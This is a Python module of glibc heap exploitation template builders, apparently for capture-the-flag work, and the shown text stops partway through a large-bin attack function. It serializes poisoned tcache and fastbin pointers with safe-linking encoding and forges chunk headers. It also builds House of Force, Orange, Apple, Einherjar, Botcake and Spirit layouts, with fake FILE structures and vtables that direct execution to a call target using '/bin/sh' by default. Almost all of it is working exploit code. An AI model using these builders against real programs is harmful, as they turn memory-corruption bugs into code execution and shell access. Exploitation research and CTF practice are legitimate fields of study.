#!/usr/bin/env python3
"""Deterministic, delivery-free glibc heap exploitation template builders.

The functions in this module serialize only attacker-controlled metadata.  They do not open a
process, socket, debugger, or target.  Each result carries the exact byte stream plus a placement
map that says where every independently controlled slice belongs.  Concatenation in ``payload`` is
therefore a transport-neutral bundle, *not* a claim that target addresses are adjacent.

The templates model LP32 and LP64 little-endian glibc metadata and switch safe-linking at glibc
2.32.  All addresses are caller supplied.  Operations and compatibility notes are deliberately
explicit because allocator state transitions remain challenge-specific.
"""
from __future__ import annotations

import json
import re
import struct
from dataclasses import dataclass
from types import MappingProxyType
from typing import Any, Callable, Mapping

try:  # direct toolkit imports are the repository convention; package import remains supported too
    from .contract import PayloadBuild
except ImportError:  # pragma: no cover - exercised by the direct-import test suite
    from contract import PayloadBuild


MAX_PAYLOAD = 1 << 20
UINT64_MAX = (1 << 64) - 1
PREV_INUSE = 1


class HeapBuildError(ValueError):
    """A requested template is internally inconsistent or outside supported bounds."""


@dataclass(frozen=True)
class HeapBuild:
    """A reviewable byte bundle and exact placement/offset map.

    ``placement_map[name]['payload_offset']`` locates a segment in :attr:`payload`, while
    ``placement_map[name]['address']`` is the caller-supplied destination.  Nested ``fields`` map
    allocator field names to relative/payload/target offsets and decoded integer values.
    """

    technique: str
    glibc_version: str
    bits: int
    payload: bytes
    placement_map: Mapping[str, Mapping[str, Any]]
    operations: tuple[str, ...]
    requirements: tuple[str, ...]
    compatibility: str
    facts: Mapping[str, Any]

    def __post_init__(self) -> None:
        if not isinstance(self.payload, bytes) or not self.payload:
            raise HeapBuildError("payload must be non-empty immutable bytes")
        object.__setattr__(self, "placement_map", _freeze(self.placement_map))
        object.__setattr__(self, "facts", _freeze(self.facts))

    @property
    def placements(self) -> dict[str, int]:
        """Flatten segment/field labels to payload offsets for the shared r5b contract."""
        answer: dict[str, int] = {}
        for segment_name, item in self.placement_map.items():
            answer[segment_name] = int(item["payload_offset"])
            for field_name, field in item["fields"].items():
                answer[f"{segment_name}.{field_name}"] = int(field["payload_offset"])
        return answer

    @property
    def widths(self) -> dict[str, int]:
        answer: dict[str, int] = {}
        for segment_name, item in self.placement_map.items():
            answer[segment_name] = int(item["length"])
            for field_name, field in item["fields"].items():
                answer[f"{segment_name}.{field_name}"] = int(field["size"])
        return answer

    def __iter__(self):
        """Support the uniform ``payload, placements = builder(...)`` convention."""
        yield self.payload
        yield self.placements

    def as_payload_build(self) -> PayloadBuild:
        """Return the shared compact contract without discarding this result's richer map."""
        return PayloadBuild(
            payload=self.payload,
            placements=self.placements,
            widths=self.widths,
            architecture="amd64" if self.bits == 64 else "i386",
            strategy=self.technique,
            metadata={
                "glibc_version": self.glibc_version,
                "compatibility": self.compatibility,
                "placement_map_json": json.dumps(_plain(self.placement_map), sort_keys=True),
            },
        )

    def segment(self, name: str) -> bytes:
        item = self.placement_map[name]
        start, length = int(item["payload_offset"]), int(item["length"])
        return self.payload[start:start + length]

    def as_dict(self) -> dict[str, Any]:
        return {
            "technique": self.technique,
            "glibc_version": self.glibc_version,
            "bits": self.bits,
            "payload_hex": self.payload.hex(),
            "payload_length": len(self.payload),
            "placement_map": _plain(self.placement_map),
            "operations": list(self.operations),
            "requirements": list(self.requirements),
            "compatibility": self.compatibility,
            "facts": _plain(self.facts),
        }

    def to_json(self) -> str:
        """Stable serialization suitable for notes and independent round-trip verification."""
        return json.dumps(self.as_dict(), sort_keys=True, separators=(",", ":"))


@dataclass(frozen=True)
class _Context:
    version_text: str
    version: tuple[int, int]
    bits: int
    word: int
    mask: int

    @property
    def header(self) -> int:
        return 2 * self.word

    @property
    def safe_linking(self) -> bool:
        return self.version >= (2, 32)

    def pack(self, value: int) -> bytes:
        _uint(value, self.bits, "metadata value")
        return struct.pack("<Q" if self.bits == 64 else "<I", value)

    def protect(self, slot_address: int, pointer: int) -> int:
        _address(slot_address, self.bits, "safe-link slot")
        _address(pointer, self.bits, "safe-link pointer", allow_zero=True)
        return pointer ^ (slot_address >> 12) if self.safe_linking else pointer


def _freeze(value: Any) -> Any:
    """Recursively freeze rich placement/fact data exposed by ``HeapBuild``."""
    if isinstance(value, Mapping):
        return MappingProxyType({key: _freeze(item) for key, item in value.items()})
    if isinstance(value, (list, tuple)):
        return tuple(_freeze(item) for item in value)
    return value


def _plain(value: Any) -> Any:
    """Return a JSON-friendly copy of recursively frozen result metadata."""
    if isinstance(value, Mapping):
        return {key: _plain(item) for key, item in value.items()}
    if isinstance(value, tuple):
        return [_plain(item) for item in value]
    return value


class _Composer:
    def __init__(self, context: _Context) -> None:
        self.context = context
        self.payload = bytearray()
        self.placements: dict[str, dict[str, Any]] = {}

    def add(
        self,
        name: str,
        address: int,
        data: bytes,
        purpose: str,
        fields: Mapping[str, tuple[int, int] | tuple[int, int, int]],
    ) -> None:
        if not isinstance(name, str) or not name or name in self.placements:
            raise HeapBuildError("placement names must be unique non-empty strings")
        _address(address, self.context.bits, f"{name} address", allow_zero=True)
        raw = bytes(data)
        if not raw:
            raise HeapBuildError(f"{name} is empty")
        if address + len(raw) > 1 << self.context.bits:
            raise HeapBuildError(f"{name} crosses the {self.context.bits}-bit address space")
        for old_name, old in self.placements.items():
            old_start = int(old["address"])
            old_end = old_start + int(old["length"])
            if address < old_end and old_start < address + len(raw):
                raise HeapBuildError(
                    f"target placement {name!r} overlaps {old_name!r}"
                )
        padding = (-len(self.payload)) % self.context.word
        self.payload.extend(b"\x00" * padding)
        start = len(self.payload)
        if start + len(raw) > MAX_PAYLOAD:
            raise HeapBuildError("combined payload exceeds 1 MiB")
        self.payload.extend(raw)
        field_map: dict[str, dict[str, int]] = {}
        for field_name, spec in fields.items():
            if len(spec) == 2:
                relative, value = spec
                size = self.context.word
            else:
                relative, value, size = spec
            if (not isinstance(relative, int) or not isinstance(size, int) or
                    relative < 0 or size <= 0 or relative + size > len(raw)):
                raise HeapBuildError(f"field {name}.{field_name} is outside its segment")
            _address(address + relative, self.context.bits, f"{name}.{field_name} address",
                     allow_zero=True)
            field_map[field_name] = {
                "relative_offset": relative,
                "payload_offset": start + relative,
                "address": address + relative,
                "size": size,
                "value": int(value),
            }
        self.placements[name] = {
            "address": address,
            "payload_offset": start,
            "length": len(raw),
            "purpose": purpose,
            "fields": field_map,
        }

    def finish(
        self,
        technique: str,
        operations: tuple[str, ...],
        requirements: tuple[str, ...],
        compatibility: str,
        facts: Mapping[str, Any] | None = None,
    ) -> HeapBuild:
        return HeapBuild(
            technique=technique,
            glibc_version=self.context.version_text,
            bits=self.context.bits,
            payload=bytes(self.payload),
            placement_map=self.placements,
            operations=operations,
            requirements=requirements,
            compatibility=compatibility,
            facts={"safe_linking": self.context.safe_linking, **dict(facts or {})},
        )


def _context(glibc_version: str, bits: int) -> _Context:
    if not isinstance(glibc_version, str) or len(glibc_version) > 16:
        raise HeapBuildError("glibc_version must be a short MAJOR.MINOR string")
    match = re.fullmatch(r"2\.(\d{1,2})", glibc_version)
    if match is None:
        raise HeapBuildError("glibc_version must be MAJOR.MINOR")
    version = 2, int(match.group(1))
    if not 23 <= version[1] <= 39:
        raise HeapBuildError("glibc_version must be within the supported 2.23-2.39 range")
    if bits not in (32, 64):
        raise HeapBuildError("bits must be 32 or 64")
    return _Context(glibc_version, version, bits, bits // 8, (1 << bits) - 1)


def _uint(value: int, bits: int, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value < (1 << bits):
        raise HeapBuildError(f"{name} must be an unsigned {bits}-bit integer")
    return value


def _address(value: int, bits: int, name: str, *, allow_zero: bool = False) -> int:
    _uint(value, bits, name)
    if value == 0 and not allow_zero:
        raise HeapBuildError(f"{name} must be non-zero")
    return value


def _aligned_address(
    context: _Context, value: int, name: str, *, allow_zero: bool = False,
) -> int:
    value = _address(value, context.bits, name, allow_zero=allow_zero)
    if value and value % (2 * context.word):
        raise HeapBuildError(
            f"{name} must be aligned to malloc alignment {2 * context.word:#x}"
        )
    return value


def _aligned_size(context: _Context, size: int, name: str = "chunk_size") -> int:
    _uint(size, context.bits, name)
    alignment = 2 * context.word
    minimum = 4 * context.word
    if size < minimum or size % alignment:
        raise HeapBuildError(f"{name} must be >={minimum:#x} and aligned to {alignment:#x}")
    return size


def _require_tcache(context: _Context) -> None:
    if context.version < (2, 26):
        raise HeapBuildError("tcache templates require glibc >= 2.26")


def _bounded_bin_size(
    context: _Context,
    size: int,
    *,
    family: str,
    maximum: int | None,
) -> int:
    size = _aligned_size(context, size)
    defaults = {
        "tcache": 0x410 if context.bits == 64 else 0x208,
        # glibc set_max_fast(DEFAULT_MXFAST): global_max_fast = (DEFAULT_MXFAST + SIZE_SZ)
        # & ~MALLOC_ALIGN_MASK, i.e. 0x80 on LP64 and 0x40 on LP32. The LP32 tunable
        # ceiling (reachable only via an explicit mallopt/max_fast_chunk_size) is 0x50,
        # handled by the `ceiling` check below, not by this default.
        "fastbin": 0x80 if context.bits == 64 else 0x40,
    }
    if family not in defaults:
        raise HeapBuildError("internal unknown bin family")
    if maximum is None:
        limit = defaults[family]
    else:
        limit = _aligned_size(context, maximum, f"{family}_max_chunk_size")
        if family == "fastbin":
            ceiling = 0xA0 if context.bits == 64 else 0x50
            if limit > ceiling:
                raise HeapBuildError(
                    f"fastbin_max_chunk_size {limit:#x} exceeds the glibc "
                    f"mallopt ceiling {ceiling:#x}"
                )
    if size > limit:
        raise HeapBuildError(
            f"chunk_size {size:#x} exceeds {family} maximum {limit:#x}"
        )
    return size


def _metadata(
    context: _Context,
    *,
    prev_size: int,
    size: int,
    fd: int | None = None,
    bk: int | None = None,
    fd_nextsize: int | None = None,
    bk_nextsize: int | None = None,
) -> tuple[bytes, dict[str, tuple[int, int]]]:
    values: list[tuple[str, int]] = [("prev_size", prev_size), ("size", size)]
    if fd is not None:
        values.append(("fd", fd))
    if bk is not None:
        values.append(("bk", bk))
    if fd_nextsize is not None:
        values.append(("fd_nextsize", fd_nextsize))
    if bk_nextsize is not None:
        values.append(("bk_nextsize", bk_nextsize))
    raw = b"".join(context.pack(value) for _, value in values)
    fields = {name: (index * context.word, value) for index, (name, value) in enumerate(values)}
    return raw, fields


def build_tcache_dup(
    *, glibc_version: str, chunk_addr: int, chunk_size: int, next_chunk_addr: int = 0,
    tcache_key: int = 0, tcache_max_chunk_size: int | None = None, bits: int = 64,
) -> HeapBuild:
    """Serialize a freed tcache entry used by classic dup or key-clearing dup bypasses."""
    c = _context(glibc_version, bits)
    _require_tcache(c)
    size = _bounded_bin_size(
        c, chunk_size, family="tcache", maximum=tcache_max_chunk_size,
    )
    chunk = _aligned_address(c, chunk_addr, "chunk_addr")
    user = chunk + c.header
    _aligned_address(c, user, "chunk user address")
    _aligned_address(c, next_chunk_addr, "next_chunk_addr", allow_zero=True)
    _address(tcache_key, bits, "tcache_key", allow_zero=True)
    has_key = c.version >= (2, 29)
    if not has_key and tcache_key:
        raise HeapBuildError("tcache_key does not exist before glibc 2.29")
    encoded = c.protect(user, next_chunk_addr)
    data = c.pack(encoded) + (c.pack(tcache_key) if has_key else b"")
    fields: dict[str, tuple[int, int]] = {"next": (0, encoded)}
    if has_key:
        fields["key"] = (c.word, tcache_key)
    out = _Composer(c)
    out.add("freed_tcache_entry", user, data,
            "tcache next and version-dependent key words under attacker control", fields)
    bypass = "classic duplicate-free path" if c.version <= (2, 28) else "key-clearing/key-collision bypass required"
    return out.finish("tcache_dup", (
        "allocate two same-size chunks in the selected tcache bin",
        "free the victim; apply the serialized next/key fields present for this glibc",
        "free or recycle the victim again using the reviewed duplicate-free bypass",
        "allocate twice to obtain the repeated entry",
    ), (
        "a real use-after-free or allocator-state primitive; this template does not invent one",
        "the selected tcache bin must have capacity",
        "a heap/slot address disclosure is required when safe-linking is active",
    ), bypass, {"chunk_size": size, "entry_address": user, "stored_next": encoded,
                "decoded_next": next_chunk_addr, "has_tcache_key": has_key})


def build_tcache_poison(
    *, glibc_version: str, freed_chunk_addr: int, chunk_size: int, target_addr: int,
    fd_slot_addr: int | None = None, clear_key: bool = True,
    tcache_max_chunk_size: int | None = None, bits: int = 64,
) -> HeapBuild:
    """Build a tcache ``next`` overwrite, including glibc 2.32+ PROTECT_PTR."""
    c = _context(glibc_version, bits)
    _require_tcache(c)
    size = _bounded_bin_size(
        c, chunk_size, family="tcache", maximum=tcache_max_chunk_size,
    )
    chunk = _aligned_address(c, freed_chunk_addr, "freed_chunk_addr")
    target = _aligned_address(c, target_addr, "target_addr")
    default_slot = chunk + c.header
    slot = default_slot if fd_slot_addr is None else _aligned_address(c, fd_slot_addr, "fd_slot_addr")
    stored = c.protect(slot, target)
    key = 0
    include_key = bool(clear_key and c.version >= (2, 29))
    raw = c.pack(stored) + (c.pack(key) if include_key else b"")
    fields: dict[str, tuple[int, int]] = {"next": (0, stored)}
    if include_key:
        fields["key"] = (c.word, key)
    out = _Composer(c)
    out.add("poisoned_tcache_entry", slot, raw, "encoded freelist pointer and optional cleared key", fields)
    return out.finish("tcache_poison", (
        "free a chunk of the chosen size into a non-full tcache bin",
        "overwrite its next word with this placement",
        "allocate once to consume the real entry, then again to receive target_addr",
    ), (
        "target_addr must satisfy the target allocator's alignment checks",
        "fd_slot_addr must be the address at which the encoded next word is stored",
    ), "safe-link aware" if c.safe_linking else "plain-pointer tcache era",
        {"chunk_size": size, "fd_slot": slot, "target": target, "stored_next": stored,
         "has_tcache_key": c.version >= (2, 29), "key_serialized": include_key})


def build_fastbin_dup(
    *, glibc_version: str, chunk_addr: int, chunk_size: int, next_chunk_addr: int,
    fd_slot_addr: int | None = None, max_fast_chunk_size: int | None = None,
    bits: int = 64,
) -> HeapBuild:
    """Serialize the fastbin FD link for an A/B/A duplicate-allocation state."""
    c = _context(glibc_version, bits)
    size = _bounded_bin_size(
        c, chunk_size, family="fastbin", maximum=max_fast_chunk_size,
    )
    chunk = _aligned_address(c, chunk_addr, "chunk_addr")
    nxt = _aligned_address(c, next_chunk_addr, "next_chunk_addr")
    slot = chunk + 2 * c.word if fd_slot_addr is None else _aligned_address(c, fd_slot_addr, "fd_slot_addr")
    stored = c.protect(slot, nxt)
    data, fields = _metadata(c, prev_size=0, size=size | PREV_INUSE, fd=stored)
    out = _Composer(c)
    out.add("fastbin_chunk", chunk, data, "fastbin chunk header and protected FD", fields)
    return out.finish("fastbin_dup", (
        "fill or disable the matching tcache bin when the target glibc has tcache",
        "free chunks in A, B, A order so the immediate-head double-free check is not triggered",
        "apply the serialized FD state and allocate through the duplicated list",
    ), ("both chunks must have the same checked size", "a slot disclosure is needed for safe-linking"),
        "safe-link aware" if c.safe_linking else "classic fastbin", {"chunk_size": size,
        "fd_slot": slot, "stored_fd": stored, "decoded_fd": nxt})


def build_fastbin_poison(
    *, glibc_version: str, victim_chunk_addr: int, fake_chunk_addr: int, chunk_size: int,
    fd_slot_addr: int | None = None, fake_next_size: int | None = None,
    max_fast_chunk_size: int | None = None, bits: int = 64,
) -> HeapBuild:
    """Build both a poisoned victim FD and the size-checked fake fastbin header."""
    c = _context(glibc_version, bits)
    size = _bounded_bin_size(
        c, chunk_size, family="fastbin", maximum=max_fast_chunk_size,
    )
    victim = _aligned_address(c, victim_chunk_addr, "victim_chunk_addr")
    fake = _aligned_address(c, fake_chunk_addr, "fake_chunk_addr")
    slot = victim + c.header if fd_slot_addr is None else _aligned_address(c, fd_slot_addr, "fd_slot_addr")
    stored = c.protect(slot, fake)
    victim_data, victim_fields = _metadata(c, prev_size=0, size=size | PREV_INUSE, fd=stored)
    next_size = size if fake_next_size is None else _bounded_bin_size(
        c, fake_next_size, family="fastbin", maximum=max_fast_chunk_size,
    )
    fake_data, fake_fields = _metadata(c, prev_size=0, size=size | PREV_INUSE)
    next_data, next_fields = _metadata(c, prev_size=size, size=next_size | PREV_INUSE)
    out = _Composer(c)
    out.add("poisoned_fastbin_victim", victim, victim_data, "victim whose FD selects fake_chunk_addr", victim_fields)
    out.add("fake_fastbin_chunk", fake, fake_data, "fake header satisfying the selected fastbin size", fake_fields)
    out.add("fake_fastbin_next", fake + size, next_data, "following header for consistency checks", next_fields)
    return out.finish("fastbin_poison", (
        "route the freed victim to fastbin rather than tcache",
        "overwrite victim FD with poisoned_fastbin_victim",
        "place both fake headers and allocate until fake_chunk_addr is returned",
    ), ("fake_chunk_addr and its following header must be writable/reachable",
        "fake size must match the victim fastbin index"),
        "safe-link aware" if c.safe_linking else "classic fastbin", {"chunk_size": size,
        "fd_slot": slot, "stored_fd": stored, "fake_user_address": fake + c.header})


def build_unsorted_bin_leak(
    *, glibc_version: str, chunk_addr: int, chunk_size: int, main_arena_addr: int,
    bin_link_offset: int = 0x60, bits: int = 64,
) -> HeapBuild:
    """Model a freed unsorted chunk whose fd/bk disclose a caller-supplied arena link."""
    c = _context(glibc_version, bits)
    size = _aligned_size(c, chunk_size)
    chunk = _aligned_address(c, chunk_addr, "chunk_addr")
    arena = _address(main_arena_addr, bits, "main_arena_addr")
    _uint(bin_link_offset, bits, "bin_link_offset")
    link = arena + bin_link_offset
    _address(link, bits, "unsorted bin link")
    data, fields = _metadata(c, prev_size=0, size=size | PREV_INUSE, fd=link, bk=link)
    out = _Composer(c)
    out.add("freed_unsorted_chunk", chunk, data, "post-free metadata containing the arena circular-list link", fields)
    return out.finish("unsorted_bin_leak", (
        "free a non-fast, non-tcache-routed chunk while preventing top consolidation",
        "read either fd or bk from the freed chunk",
        "subtract bin_link_offset to recover main_arena_addr",
    ), ("chunk must reach the unsorted bin", "main_arena_addr/bin_link_offset must match the supplied libc"),
        "arena-link model", {"chunk_size": size, "leaked_value": link,
        "main_arena_subtract": bin_link_offset})


def build_house_of_force(
    *, glibc_version: str, top_chunk_addr: int, target_addr: int, bits: int = 64,
) -> HeapBuild:
    """Forge the top size and calculate the exact bridge chunk size to ``target_addr``."""
    c = _context(glibc_version, bits)
    top = _aligned_address(c, top_chunk_addr, "top_chunk_addr")
    target = _aligned_address(c, target_addr, "target_addr")
    if target <= top + c.header:
        raise HeapBuildError("target_addr must follow the current top user address")
    bridge = target - top - c.header
    if bridge % (2 * c.word):
        raise HeapBuildError("target requires an allocator-aligned bridge chunk")
    data, fields = _metadata(c, prev_size=0, size=c.mask)
    out = _Composer(c)
    out.add("forged_top_header", top, data, "maximal top size used by the classic wilderness wrap/advance", fields)
    compatibility = ("classic House of Force (top-size consistency not yet enforced)"
                     if c.version <= (2, 28) else
                     "template only: stock glibc 2.29+ rejects an oversized top unless checks are bypassed")
    return out.finish("house_of_force", (
        "overwrite the current top header with forged_top_header",
        "request a chunk whose normalized chunk size equals bridge_chunk_size",
        "the following allocation begins at target_addr",
    ), ("caller must convert bridge_chunk_size to a request without changing request2size",
        "target must be above top and aligned", "modern top-size checks may require a separate bypass"),
        compatibility, {"top_user_address": top + c.header, "target": target,
        "bridge_chunk_size": bridge, "request_interval_min": max(0, bridge - (3 * c.word - 1)),
        "request_interval_max": bridge - c.word})


def build_house_of_orange(
    *, glibc_version: str, old_top_addr: int, old_top_size: int, main_arena_bin_addr: int,
    io_list_all_addr: int, fake_file_addr: int, fake_vtable_addr: int, call_target: int,
    lock_addr: int, command: bytes = b"/bin/sh\x00", bits: int = 64,
) -> HeapBuild:
    """Build the classic pre-vtable-validation House-of-Orange unsorted/FSOP layout."""
    c = _context(glibc_version, bits)
    if bits != 64:
        raise HeapBuildError("House of Orange FILE layout is supported only for LP64")
    top = _aligned_address(c, old_top_addr, "old_top_addr")
    size = _aligned_size(c, old_top_size, "old_top_size")
    arena = _address(main_arena_bin_addr, bits, "main_arena_bin_addr")
    io_list = _address(io_list_all_addr, bits, "io_list_all_addr")
    file_addr = _address(fake_file_addr, bits, "fake_file_addr")
    vtable_addr = _address(fake_vtable_addr, bits, "fake_vtable_addr")
    call = _address(call_target, bits, "call_target")
    lock = _address(lock_addr, bits, "lock_addr")
    if not isinstance(command, bytes) or not command or len(command) > 16 or not command.endswith(b"\x00"):
        raise HeapBuildError("command must be 1..16 bytes and NUL terminated")
    old_data, old_fields = _metadata(c, prev_size=0, size=size | PREV_INUSE,
                                     fd=arena, bk=io_list - 2 * c.word)
    fp = bytearray(0xE0)
    fp[:len(command)] = command
    struct.pack_into("<Q", fp, 0x20, 0)
    struct.pack_into("<Q", fp, 0x28, 1)
    struct.pack_into("<Q", fp, 0x68, 0)
    struct.pack_into("<Q", fp, 0x88, lock)
    struct.pack_into("<i", fp, 0xC0, 0)
    struct.pack_into("<Q", fp, 0xD8, vtable_addr)
    vt = bytearray(0x40)
    struct.pack_into("<Q", vt, 0x18, call)
    out = _Composer(c)
    out.add("old_top_unsorted", top, old_data, "old top in unsorted bin with bk aimed before _IO_list_all", old_fields)
    out.add("fake_file", file_addr, bytes(fp), "classic flushable _IO_FILE_plus", {
        "write_base": (0x20, 0), "write_ptr": (0x28, 1), "chain": (0x68, 0),
        "lock": (0x88, lock), "mode": (0xC0, 0, 4), "vtable": (0xD8, vtable_addr),
    })
    out.add("fake_vtable", vtable_addr, bytes(vt), "legacy __overflow slot selecting call_target", {
        "overflow": (0x18, call),
    })
    compat = ("classic House of Orange route" if c.version < (2, 24)
              else "stock glibc 2.24+ validates main vtables; a distinct validation bypass is required")
    return out.finish("house_of_orange", (
        "corrupt top size and force sysmalloc so the old top reaches unsorted bin",
        "apply old_top_unsorted so unsorted insertion targets _IO_list_all",
        "place fake_file and fake_vtable, then reach a libc flush path",
    ), ("classic route depends on an unsorted-bin write and FILE-list traversal",
        "call_target receives fake_file_addr as its stream argument"), compat,
        {"chunk_size": size, "io_list_all_write_lvalue": io_list,
         "unsorted_bk": io_list - 2 * c.word, "command_hex": command.hex()})


def build_house_of_apple(
    *, glibc_version: str, fake_file_addr: int, wide_data_addr: int, wide_vtable_addr: int,
    io_wfile_jumps_addr: int, call_target: int, lock_addr: int,
    command: bytes = b"  /bin/sh\x00", bits: int = 64,
) -> HeapBuild:
    """Build a hook-less House-of-Apple wide-FILE call layout."""
    c = _context(glibc_version, bits)
    if bits != 64:
        raise HeapBuildError("House of Apple FILE layout is supported only for LP64")
    if c.version < (2, 24):
        raise HeapBuildError("House of Apple wide-vtable template requires glibc >= 2.24")
    file_addr = _address(fake_file_addr, bits, "fake_file_addr")
    wide_addr = _address(wide_data_addr, bits, "wide_data_addr")
    wvt_addr = _address(wide_vtable_addr, bits, "wide_vtable_addr")
    jumps = _address(io_wfile_jumps_addr, bits, "io_wfile_jumps_addr")
    call = _address(call_target, bits, "call_target")
    lock = _address(lock_addr, bits, "lock_addr")
    if not isinstance(command, bytes) or not command.startswith(b"  ") or not command.endswith(b"\x00") or len(command) > 32:
        raise HeapBuildError("command must be <=32 NUL-terminated bytes beginning with two spaces")
    fp = bytearray(0xE0)
    fp[:len(command)] = command
    struct.pack_into("<Q", fp, 0x20, 0)
    struct.pack_into("<Q", fp, 0x28, 1)
    struct.pack_into("<Q", fp, 0x88, lock)
    struct.pack_into("<Q", fp, 0xA0, wide_addr)
    struct.pack_into("<i", fp, 0xC0, 1)
    struct.pack_into("<Q", fp, 0xD8, jumps)
    wide = bytearray(0xE8)
    struct.pack_into("<Q", wide, 0x18, 0)
    struct.pack_into("<Q", wide, 0x20, 1)
    struct.pack_into("<Q", wide, 0x30, 0)
    struct.pack_into("<Q", wide, 0xE0, wvt_addr)
    wvt = bytearray(0x80)
    struct.pack_into("<Q", wvt, 0x68, call)
    out = _Composer(c)
    out.add("fake_file", file_addr, bytes(fp), "validated _IO_wfile_jumps stream", {
        "write_base": (0x20, 0), "write_ptr": (0x28, 1), "lock": (0x88, lock),
        "wide_data": (0xA0, wide_addr), "mode": (0xC0, 1, 4), "vtable": (0xD8, jumps),
    })
    out.add("fake_wide_data", wide_addr, bytes(wide), "wide allocation state", {
        "write_base": (0x18, 0), "write_ptr": (0x20, 1), "buf_base": (0x30, 0),
        "wide_vtable": (0xE0, wvt_addr),
    })
    out.add("fake_wide_vtable", wvt_addr, bytes(wvt), "wide __doallocate slot selecting call_target", {
        "doallocate": (0x68, call),
    })
    return out.finish("house_of_apple", (
        "place all three structures at their mapped addresses",
        "redirect a reachable FILE object/list link to fake_file_addr",
        "reach _IO_wfile_overflow so the wide __doallocate slot is used",
    ), ("io_wfile_jumps_addr must be the matching libc's validated table",
        "the trigger and FILE-list corruption remain challenge-specific"),
        "hook-less wide-vtable route" if c.version >= (2, 34) else "validated wide-vtable route",
        {"command_hex": command.hex(), "call_target": call})


def build_house_of_einherjar(
    *, glibc_version: str, fake_chunk_addr: int, victim_chunk_addr: int,
    victim_chunk_size: int, fake_chunk_size: int | None = None, bits: int = 64,
) -> HeapBuild:
    """Build backward-consolidation metadata with unlink-consistent fake fd/bk links."""
    c = _context(glibc_version, bits)
    fake = _aligned_address(c, fake_chunk_addr, "fake_chunk_addr")
    victim = _aligned_address(c, victim_chunk_addr, "victim_chunk_addr")
    if victim <= fake:
        raise HeapBuildError("victim_chunk_addr must follow fake_chunk_addr")
    distance = victim - fake
    if distance % (2 * c.word):
        raise HeapBuildError("fake-to-victim distance must be allocator aligned")
    victim_size = _aligned_size(c, victim_chunk_size, "victim_chunk_size")
    fake_size = distance if fake_chunk_size is None else _aligned_size(c, fake_chunk_size, "fake_chunk_size")
    if fake_size != distance:
        raise HeapBuildError("fake_chunk_size must equal victim_chunk_addr - fake_chunk_addr")
    fake_data, fake_fields = _metadata(c, prev_size=0, size=fake_size | PREV_INUSE, fd=fake, bk=fake)
    victim_data, victim_fields = _metadata(c, prev_size=fake_size, size=victim_size & ~PREV_INUSE)
    out = _Composer(c)
    out.add("fake_previous_chunk", fake, fake_data, "self-linked fake free chunk satisfying unlink checks", fake_fields)
    out.add("victim_header", victim, victim_data, "victim with forged prev_size and cleared PREV_INUSE", victim_fields)
    return out.finish("house_of_einherjar", (
        "place fake_previous_chunk before the victim",
        "overwrite victim prev_size and clear its PREV_INUSE bit with victim_header",
        "free/consolidate the victim so backward consolidation reaches the fake chunk",
    ), ("the fake chunk must pass the target glibc's unlink and size consistency checks",
        "a later allocation is needed to turn consolidation into overlap"),
        "backward-consolidation template", {"backward_distance": distance,
        "overlap_start": fake + c.header})


def build_house_of_botcake(
    *, glibc_version: str, overlapping_chunk_addr: int, chunk_size: int,
    target_addr: int, fd_slot_addr: int | None = None,
    tcache_max_chunk_size: int | None = None, bits: int = 64,
) -> HeapBuild:
    """Build the UAF overwrite used after Botcake's unsorted/tcache overlap is established."""
    c = _context(glibc_version, bits)
    _require_tcache(c)
    if c.version < (2, 29):
        raise HeapBuildError("House of Botcake models the glibc 2.29+ tcache-key era")
    size = _bounded_bin_size(
        c, chunk_size, family="tcache", maximum=tcache_max_chunk_size,
    )
    chunk = _aligned_address(c, overlapping_chunk_addr, "overlapping_chunk_addr")
    target = _aligned_address(c, target_addr, "target_addr")
    slot = chunk + c.header if fd_slot_addr is None else _aligned_address(c, fd_slot_addr, "fd_slot_addr")
    stored = c.protect(slot, target)
    raw = c.pack(stored) + c.pack(0)
    out = _Composer(c)
    out.add("overlapped_tcache_entry", slot, raw, "Botcake overlap writes protected next and clears tcache key", {
        "next": (0, stored), "key": (c.word, 0),
    })
    return out.finish("house_of_botcake", (
        "fill the tcache bin, free the victim to unsorted, then free its buddy to tcache",
        "consolidate/reallocate to overlap the still-referenced tcache entry",
        "apply overlapped_tcache_entry and allocate through the poisoned bin",
    ), ("the unsorted/tcache overlap must be established by real allocator actions",
        "a slot disclosure is required when safe-linking is active"),
        "Botcake key-bypass with safe-link support", {"chunk_size": size, "fd_slot": slot,
        "stored_next": stored, "target": target})


def build_house_of_spirit(
    *, glibc_version: str, fake_chunk_addr: int, chunk_size: int,
    following_chunk_size: int | None = None, max_bin_chunk_size: int | None = None,
    bits: int = 64,
) -> HeapBuild:
    """Build adjacent fake headers for freeing a non-heap pointer into a size class."""
    c = _context(glibc_version, bits)
    fake = _aligned_address(c, fake_chunk_addr, "fake_chunk_addr")
    family = "tcache" if c.version >= (2, 26) else "fastbin"
    size = _bounded_bin_size(
        c, chunk_size, family=family, maximum=max_bin_chunk_size,
    )
    following_size = size if following_chunk_size is None else _aligned_size(c, following_chunk_size, "following_chunk_size")
    fake_data, fake_fields = _metadata(c, prev_size=0, size=size | PREV_INUSE)
    following_data, following_fields = _metadata(c, prev_size=size, size=following_size | PREV_INUSE)
    out = _Composer(c)
    out.add("fake_chunk", fake, fake_data, "header immediately before the pointer passed to free", fake_fields)
    out.add("following_chunk", fake + size, following_data, "following size/header satisfying free consistency checks", following_fields)
    route = "tcache first" if c.version >= (2, 26) else "fastbin route"
    return out.finish("house_of_spirit", (
        "place both headers in attacker-controlled writable memory",
        "pass fake_user_address to free through the challenge's pointer-control primitive",
        "allocate the same size class to receive fake_user_address",
    ), ("fake_user_address must meet malloc alignment", "the region must survive allocator consistency checks"),
        route, {"chunk_size": size, "fake_user_address": fake + c.header,
        "following_header_address": fake + size})


def build_large_bin_attack(
    *, glibc_version: str, large_chunk_addr: int, chunk_size: int, target_addr: int,
    fd_addr: int, bk_addr: int, fd_nextsize_addr: int | None = None, bits: int = 64,
) -> HeapBuild:
    """Build a classic large-bin insertion metadata write aimed at ``target_addr``."""
    c = _context(glibc_version, bits)
    chunk = _aligned_address(c, large_chunk_addr, "large_chunk_addr")
    size = _aligned_size(c, chunk_size)
    if size < (0x400 if bits == 64 else 0x200):
        raise HeapBuildError("chunk_size is too small for a conventional large-bin template")
    target = _address(target_addr, bits, "target_addr")
    fd = _address(fd_addr, bits, "fd_addr")
    bk = _address(bk_addr, bits, "bk_addr")
    fns = chunk if fd_nextsize_addr is None else _address(fd_nextsize_addr, bits, "fd_nextsize_addr")
    bns = target - 4 * c.word
    _address(bns, bits, "target_addr - bk_nextsize linkage")
    data, fields = _metadata(c, prev_size=0, size=size | PREV_INUSE, fd=fd, bk=bk,
